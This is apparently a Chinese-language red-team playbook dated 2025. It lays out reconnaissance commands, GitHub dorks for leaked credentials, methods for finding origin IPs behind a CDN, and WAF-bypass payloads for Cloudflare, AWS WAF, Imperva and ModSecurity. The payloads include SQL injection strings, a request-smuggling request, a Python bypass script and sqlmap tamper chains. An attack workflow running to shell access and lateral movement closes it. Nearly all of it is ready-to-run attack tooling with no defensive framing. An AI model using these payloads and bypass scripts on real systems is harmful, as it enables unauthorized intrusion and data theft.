# 最新红队渗透技术库 2025 - 专业级

## 🎯 最新打点技术（2025）

### 1. 多维度资产发现（打点核心）

#### 1.1 子域名深度枚举
```bash
# 组合工具链（最大化发现）
subfinder -d target.com -all -recursive -o subs.txt
amass enum -d target.com -active -brute -w wordlist.txt -o amass.txt
chaos -d target.com -o chaos.txt
assetfinder -subs-only target.com >> subs.txt

# 去重合并
cat subs.txt amass.txt chaos.txt | sort -u > final_subs.txt

# 存活验证（多线程）
httpx -l final_subs.txt -mc 200,301,302,403 -t 200 -o alive.txt
```

#### 1.2 证书透明度挖掘
```bash
# 证书透明度（CT日志）
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
certsh -d target.com
ctfr -d target.com
```

#### 1.3 DNS历史记录
```bash
# Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json&collapse=urlkey" | jq -r '.[] | .[2]' | sort -u

# SecurityTrails
# 需要API key
```

#### 1.4 GitHub代码泄露
```bash
# 搜索目标相关代码
# 关键词组合
github-dork:
site:github.com "target.com" password
site:github.com "target.com" api_key
site:github.com "target.com" secret
site:github.com "target.com" token
site:github.com "target.com" .env
site:github.com "target.com" aws_access_key
site:github.com "target.com" private_key
```

### 2. C段与IP资产关联

#### 2.1 C段扫描
```bash
# 获取目标IP
host target.com | grep "has address" | awk '{print $4}'

# C段扫描
TARGET_IP="1.2.3.4"
C_SEGMENT=$(echo $TARGET_IP | cut -d. -f1-3)
for i in {1..254}; do
    host $C_SEGMENT.$i | grep -v "not found"
done

# 或使用masscan
masscan $C_SEGMENT.0/24 -p80,443,8080,8443 --rate=1000
```

#### 2.2 ASN枚举
```bash
# 通过ASN获取所有IP段
whois -h whois.radb.net -- "-i origin AS12345" | grep -E "^route:" | awk '{print $2}'

# 或使用工具
asnmap -as AS12345
```

### 3. 边缘资产发现（高价值入口）

#### 3.1 测试/开发环境
```bash
# 常见前缀
for prefix in dev test staging uat pre prod demo sandbox; do
    echo "$prefix.target.com"
    echo "$prefix-api.target.com"
    echo "api-$prefix.target.com"
done | httpx -mc 200,403 -o edge.txt
```

#### 3.2 云存储桶枚举
```bash
# AWS S3
aws s3 ls s3://target-bucket/ --no-sign-request
s3scanner scan target-bucket

# 阿里云OSS
ossutil ls oss://bucket-name --config-file config

# 腾讯云COS
coscmd list -a
```

#### 3.3 API文档发现
```bash
# 常见路径
for path in api docs swagger graphql playground; do
    curl -s "https://target.com/$path" | grep -i "swagger\|api\|graphql"
done
```

---

## 🛡️ CDN/WAF绕过技术（2025最新）

### 1. CDN绕过 - 真实IP挖掘

#### 1.1 历史DNS记录
```bash
# SecurityTrails历史DNS
# 需要API
curl "https://api.securitytrails.com/v1/history/$DOMAIN/dns/a" \
  -H "APIKEY: $API_KEY"

# ViewDNS历史
curl "https://viewdns.info/iphistory/?domain=$DOMAIN"
```

#### 1.2 子域名IP关联
```bash
# 子域名可能未接入CDN
subfinder -d target.com | httpx -ip -o sub_ips.txt
# 分析IP，找出真实IP段
```

#### 1.3 邮件服务器IP
```bash
# 邮件服务器通常不通过CDN
dig target.com MX
nslookup mail.target.com
```

#### 1.4 SSL证书IP
```bash
# 证书关联IP
curl -s "https://crt.sh/?q=%25target.com&output=json" | jq -r '.[] | .id' | while read id; do
    curl -s "https://crt.sh/?id=$id" | grep -oP '(?<=IP Address: )[0-9.]+'
done
```

#### 1.5 国外节点探测
```bash
# 从国外节点访问可能绕过CDN
# 使用海外代理
curl --proxy socks5://proxy:1080 https://target.com
```

### 2. WAF绕过技术（2025最新）

#### 2.1 Cloudflare WAF绕过

**方法1：Unicode编码绕过**
```python
# Unicode编码SQL注入
payload = "UNION/**/SELECT/**/1,2,3"
encoded = payload.encode('unicode_escape').decode('ascii')
# 或使用\u00XX格式
```

**方法2：请求走私绕过**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 5

12345GET /admin HTTP/1.1
Host: target.com
```

**方法3：HTTP/2 多路复用**
```bash
curl --http2 -H "Host: target.com" https://target.com/page?id=1' OR 1=1--
```

**方法4：IP轮换 + User-Agent随机**
```bash
# 使用代理池轮换IP
for proxy in $(cat proxies.txt); do
    curl --proxy $proxy \
         -H "User-Agent: $(shuf -n1 user_agents.txt)" \
         "https://target.com/page?id=1"
done
```

#### 2.2 AWS WAF绕过

**方法1：参数污染**
```http
GET /page?id=1&id=1' OR 1=1-- HTTP/1.1
Host: target.com
```

**方法2：大小写混合**
```sql
UnIoN SeLeCt 1,2,3
```

**方法3：注释符绕过**
```sql
UNION/**/SELECT/**/1,2,3
UNION/*!*/SELECT/*!*/1,2,3
```

#### 2.3 Imperva/Incapsula绕过

**方法1：Cookie注入**
```http
Cookie: session=valid; id=1' OR 1=1--
```

**方法2：Header注入**
```http
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
```

#### 2.4 ModSecurity绕过

**方法1：换行符绕过**
```sql
UNION
SELECT
1,2,3
```

**方法2：Tab符绕过**
```sql
UNION	SELECT	1,2,3
```

#### 2.5 通用WAF绕过技巧

**方法1：多编码组合**
```python
# URL编码 + Unicode + HTML实体
payload = "1' OR 1=1--"
encoded = quote(quote(payload))  # 双重URL编码
```

**方法2：HTTP方法混淆**
```http
POST /page?id=1' OR 1=1-- HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
```

**方法3：Content-Type绕过**
```http
POST /page HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

id=1' OR 1=1--
```

### 3. 自动化WAF绕过工具

#### 3.1 SQLMap高级绕过
```bash
# 组合多个tamper脚本
sqlmap -u "http://target.com/page?id=1" \
    --tamper=space2comment,charencode,randomcase \
    --random-agent \
    --proxy="http://proxy:8080" \
    --batch
```

#### 3.2 自定义绕过脚本
```python
# waf_bypass.py
import requests
import random

def bypass_waf(url, payload):
    # 1. Unicode编码
    payload1 = payload.encode('unicode_escape').decode('ascii')
    
    # 2. 大小写随机
    payload2 = ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
    
    # 3. 注释符注入
    payload3 = payload.replace(' ', '/**/')
    
    for p in [payload1, payload2, payload3]:
        r = requests.get(url, params={'id': p})
        if 'success' in r.text.lower():
            return p
    return None
```

---

## 🚀 攻击面扩展技术（2025）

### 1. 供应链攻击面

#### 1.1 第三方服务枚举
```bash
# 查找目标使用的第三方服务
curl -s "https://target.com" | grep -oP 'https?://[^"\' ]+' | sort -u

# 常见第三方：
# - CDN (Cloudflare, CloudFront, Fastly)
# - 分析工具 (Google Analytics, Mixpanel)
# - 支付 (Stripe, PayPal)
# - 客服 (Intercom, Zendesk)
```

#### 1.2 供应商资产
```bash
# 查找供应商域名
# 通过WHOIS查找关联组织
whois target.com | grep "Organization"

# 查找同组织其他域名
curl -s "https://crt.sh/?q=%25ORG_NAME%25&output=json" | jq -r '.[].name_value'
```

#### 1.3 开源组件漏洞
```bash
# 识别Web框架
whatweb target.com
wappalyzer target.com

# 查找对应CVE
searchsploit "WordPress 5.0"
```

### 2. 云原生攻击面

#### 2.1 云存储桶
```bash
# AWS S3
aws s3 ls s3://bucket-name --no-sign-request
# 或使用工具
s3scanner scan bucket-name
bucket_finder -w wordlist.txt
```

#### 2.2 Kubernetes API
```bash
# 发现K8s API
curl -k https://target.com/api/v1
curl -k https://target.com/healthz

# 未授权访问
kubectl --server=https://target.com:6443 get pods
```

#### 2.3 Docker Registry
```bash
# 发现Registry
curl https://target.com/v2/_catalog
curl https://target.com/v2/IMAGE_NAME/tags/list
```

### 3. API攻击面

#### 3.1 GraphQL端点
```bash
# 发现GraphQL
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name } } }"}'

# 常见路径
# /graphql
# /graphiql
# /v1/graphql
# /api/graphql
```

#### 3.2 REST API发现
```bash
# 通过JS文件发现API
curl -s https://target.com/app.js | grep -oP 'https?://[^"\' ]+/api/[^"\' ]+'

# 通过Swagger
curl https://target.com/swagger.json
curl https://target.com/api-docs
```

#### 3.3 Webhook端点
```bash
# 查找Webhook配置
# GitHub webhook
# GitLab webhook
# CI/CD webhook
```

### 4. 移动端攻击面

#### 4.1 APK分析
```bash
# 反编译APK
apktool d app.apk
jadx app.apk

# 提取API端点
grep -r "https://" app/ | grep -v "android"
```

#### 4.2 iOS应用分析
```bash
# 砸壳
class-dump app.ipa

# 提取API
strings app | grep -i "https://"
```

### 5. 自动化攻击面发现

#### 5.1 全自动化扫描脚本
```bash
#!/bin/bash
# auto_recon.sh

TARGET=$1
OUT_DIR="recon_$TARGET"
mkdir -p $OUT_DIR

# 1. 子域名
echo "[+] 子域名枚举..."
subfinder -d $TARGET -o $OUT_DIR/subs.txt
amass enum -d $TARGET -o $OUT_DIR/amass.txt
cat $OUT_DIR/subs.txt $OUT_DIR/amass.txt | sort -u > $OUT_DIR/all_subs.txt

# 2. 存活验证
echo "[+] 存活验证..."
httpx -l $OUT_DIR/all_subs.txt -o $OUT_DIR/alive.txt

# 3. 端口扫描
echo "[+] 端口扫描..."
cat $OUT_DIR/alive.txt | cut -d/ -f3 | naabu -o $OUT_DIR/ports.txt

# 4. 目录扫描
echo "[+] 目录扫描..."
cat $OUT_DIR/alive.txt | ffuf -w wordlist.txt -u FUZZ

# 5. 漏洞扫描
echo "[+] 漏洞扫描..."
nuclei -l $OUT_DIR/alive.txt -o $OUT_DIR/nuclei.txt

echo "[+] 完成！结果在 $OUT_DIR/"
```

---

## 📊 最新CVE利用（2025）

### 已发现最新CVE
- CVE-2025-11001
- CVE-2025-49844
- CVE-2025-53770
- CVE-2025-32463
- CVE-2025-33073
- CVE-2025-31258
- CVE-2025-54253 (Adobe AEM Forms)
- CVE-2025-59287 (WSUS RCE)
- CVE-2025-50168 (Pwn2Own Berlin 2025)

### 最新Exploit-DB漏洞
- Flowise 3.0.4 - RCE
- Casdoor 2.95.0 - CSRF
- ClipBucket 5.5.0 - File Upload
- dotCMS 25.07.02 - SQL Injection
- XWiki 15.10.10 - RCE
- Ivanti Endpoint Manager - Auth Bypass

---

## 🎯 实战打点流程（2025标准）

### 阶段1：信息收集（30分钟）
```bash
1. 子域名枚举（subfinder + amass）
2. 存活验证（httpx）
3. 端口扫描（naabu）
4. 技术栈识别（whatweb + wappalyzer）
5. 证书透明度（crt.sh）
6. GitHub代码泄露（手动搜索）
```

### 阶段2：漏洞发现（1小时）
```bash
1. 目录扫描（ffuf/gobuster）
2. 参数发现（paramspider）
3. 漏洞扫描（nuclei）
4. 手工测试（XSS/SQL注入/SSRF）
```

### 阶段3：CDN/WAF绕过（30分钟）
```bash
1. 真实IP挖掘
2. WAF识别（wafw00f）
3. 绕过尝试（编码/走私/代理）
4. 边缘资产测试
```

### 阶段4：漏洞利用（1小时）
```bash
1. 验证漏洞
2. 获取Shell/RCE
3. 权限提升
4. 内网渗透
```

---

## 🔧 必备工具链（2025）

### 信息收集
- subfinder - 子域名枚举
- amass - 深度资产发现
- httpx - HTTP探测
- naabu - 端口扫描
- nuclei - 漏洞扫描

### WAF绕过
- sqlmap - SQL注入（tamper脚本）
- wafw00f - WAF识别
- 自定义绕过脚本

### 漏洞利用
- nuclei-templates - 最新POC
- exploit-db - 漏洞库
- GitHub - 最新exploit

---

## 💡 核心原则

1. **多维度发现** - 不依赖单一来源
2. **边缘资产优先** - 测试环境通常防护较弱
3. **自动化优先** - 工具链组合，最大化效率
4. **绕过思维** - 遇到WAF立即切换策略
5. **持续更新** - 每天关注最新CVE和exploit

---

**最后更新：2025-11-05**
**版本：v1.0 - 专业级红队技术库**
